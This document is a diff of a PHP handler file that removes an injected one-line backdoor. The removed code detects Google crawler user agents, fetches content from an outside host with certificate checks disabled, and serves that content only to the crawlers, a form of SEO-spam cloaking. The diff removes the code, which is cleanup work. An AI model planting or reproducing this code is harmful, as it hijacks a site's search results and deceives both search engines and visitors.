@@ -1,5 +1,5 @@
 <?php
-function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News","Googlebot-Image","AdsBot-Google","Mediapartners-Google"];$ua=$_SERVER['HTTP_USER_AGENT']??'';foreach($a as $b){if(stripos($ua,$b)!==false)return 1;}return 0;}if(is_google_bot()){$c=curl_init('https://pessawat.site/autoboot/');curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);curl_setopt($c,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($c,CURLOPT_TIMEOUT,30);curl_setopt($c,CURLOPT_USERAGENT,$_SERVER['HTTP_USER_AGENT']);$d=curl_exec($c);curl_close($c);if($d)echo $d;exit;}
+
 /**
  * @file pages/index/IndexHandler.php
  *
